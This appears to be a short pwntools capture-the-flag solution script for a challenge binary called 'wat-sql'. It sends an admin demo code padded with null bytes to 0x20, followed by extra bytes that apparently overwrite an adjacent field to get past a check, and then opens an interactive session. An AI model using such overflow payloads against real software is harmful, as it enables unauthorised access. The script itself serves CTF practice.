from pwn import *

e = ELF('./wat-sql')
p = process('./wat-sql')

print p.recvuntil('code: ')
payload = 'watevr-sql2019-demo-code-admin'
payload += '\x00'*(0x20 - len(payload))
payload += 'sey'
p.send(payload)
p.interactive()